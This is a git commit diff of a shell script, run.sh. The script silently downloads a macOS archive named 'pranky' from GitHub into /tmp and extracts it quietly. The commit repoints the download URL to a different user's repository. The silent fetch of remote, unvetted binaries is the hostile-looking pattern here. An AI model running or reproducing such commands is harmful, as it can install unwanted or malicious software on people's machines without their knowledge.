6c0da5c01cf866734da04721dcfc7884521c1266
Lifany <41371368+Lifany@users.noreply.github.com>
2019-01-08 14:18:05 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,6 +1,6 @@
 mkdir -p /tmp/spoody/
 
-curl -s -L https://github.com/mehdibo/golden-cable/blob/master/pranky-darwin-x64.tar.gz?raw=true -o /tmp/spoody/pranky.tar.gz > /dev/null
+curl -s -L https://github.com/Lifany/banana/blob/master/pranky-darwin-x64.tar.gz?raw=true -o /tmp/spoody/pranky.tar.gz > /dev/null
 
 tar -xvf /tmp/spoody/pranky.tar.gz -C /tmp/spoody > /dev/null
 
